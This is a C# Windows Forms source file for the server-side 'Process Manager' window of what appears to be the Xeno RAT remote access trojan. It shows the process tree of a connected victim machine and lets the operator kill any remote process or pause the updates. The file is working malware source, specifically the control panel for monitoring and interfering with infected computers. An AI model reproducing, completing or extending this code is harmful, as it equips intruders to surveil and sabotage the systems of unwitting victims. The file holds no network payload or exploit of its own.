using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class ProcessManager : Form
    {
        Node client;
        bool paused = false;
        public ProcessManager(Node _client)
        {
            client = _client;
            InitializeComponent();
            _ = Task.Run(async () => await RecvThread());
        }
        public async Task RecvThread()
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                {
                    if (!this.IsDisposed)
                    {
                        this.Invoke((MethodInvoker)(() =>
                        {
                            this.Close();
                        }));
                    }
                    return;
                }
                if (paused) continue;
                List<ProcessNode> b = DeserializeProcessList(data);
                DisplayProcessTree(b);
            }
        }

        private void PopulateTreeView(ProcessNode node, TreeNode parentNode)
        {
            TreeNode treeNode = new TreeNode($"{node.Name} ({node.PID}): {node.FilePath} ({node.FileDescription})");
            treeNode.Tag = node;


            if (parentNode != null)
            {
                treeView1.Invoke((Action)(() =>
                {
                    parentNode.Nodes.Add(treeNode);
                }));
            }
            else
            {
                treeView1.Invoke((Action)(() =>
                {
                    treeView1.BeginUpdate();
                    treeView1.Nodes.Add(treeNode);
                }));
            }

            foreach (var childNode in node.Children)
            {
                PopulateTreeView(childNode, treeNode);
            }

            if (parentNode == null)
            {
                treeView1.Invoke((Action)(() =>
                {
                    treeView1.EndUpdate();
                }));
            }
        }

        private void DisplayProcessTree(List<ProcessNode> processList)
        {
            treeView1.Invoke((Action)(() =>
            {
                treeView1.BeginUpdate();
                treeView1.Nodes.Clear();
            }));

            foreach (var rootNode in processList)
            {
                PopulateTreeView(rootNode, null);
            }

            treeView1.Invoke((Action)(() =>
            {
                treeView1.EndUpdate();
            }));
        }


        private static List<ProcessNode> DeserializeProcessList(byte[] serializedData)
        {
            List<ProcessNode> processList = new List<ProcessNode>();

            using (MemoryStream memoryStream = new MemoryStream(serializedData))
            {
                using (BinaryReader reader = new BinaryReader(memoryStream))
                {
                    // Deserialize the number of processes
                    int processCount = reader.ReadInt32();

                    // Deserialize each process node
                    for (int i = 0; i < processCount; i++)
                    {
                        ProcessNode processNode = DeserializeProcessNode(reader);
                        processList.Add(processNode);
                    }
                }
            }

            return processList;
        }
        private static ProcessNode DeserializeProcessNode(BinaryReader reader)
        {
            int pid = reader.ReadInt32();
            int childCount = reader.ReadInt32();
            string filePath = reader.ReadString();
            string fileDescription = reader.ReadString();
            string name = reader.ReadString();
            ProcessNode processNode = new ProcessNode(filePath)
            {
                PID = pid,
                Name = name,
                FileDescription = fileDescription,
                Children = new List<ProcessNode>()
            };

            for (int i = 0; i < childCount; i++)
            {
                ProcessNode child = DeserializeProcessNode(reader);
                processNode.Children.Add(child);
            }

            return processNode;
        }
        private async void killPid(int pid)
        {
            try 
            {
                await client.SendAsync(client.sock.IntToBytes(pid));
                MessageBox.Show("sent the kill command");
            } 
            catch 
            {
                MessageBox.Show("error sending the kill command");
            }
        }
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                try 
                {
                    ProcessNode procnode = ((ProcessNode)e.Node.Tag);
                    ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    PopupMenu.Items.Add("Kill " + procnode.Name);
                    PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __) => killPid(procnode.PID));
                    PopupMenu.Show(Cursor.Position);
                } 
                catch 
                {
                    MessageBox.Show("something went wrong...");
                }
            }
        }

        private void ProcessManager_Load(object sender, EventArgs e)
        {

        }

        private void ProcessManager_Load_1(object sender, EventArgs e)
        {

        }


        private void ProcessManager_Load_2(object sender, EventArgs e)
        {

        }


        private void ProcessManager_Load_3(object sender, EventArgs e)
        {

        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            if (!paused)
            {
                paused = true;
                await client.SendAsync(new byte[] { (byte)1 });
                button1.Text = "Unpause";
            }
            else 
            {
                paused = false;
                await client.SendAsync(new byte[] { (byte)0 });
                button1.Text = "Pause";
            }
            
        }
    }
    class ProcessNode
    {
        public string FilePath { get; }
        public int PID { set;  get; }
        public string FileDescription { get; set; }
        public string Name { set; get; }
        public List<ProcessNode> Children { get; set; }

        public ProcessNode(string filePath)
        {
            FilePath = filePath;
            if (filePath == "") 
            {
                FilePath = "Unkown Path";
            }
        }
    }
}
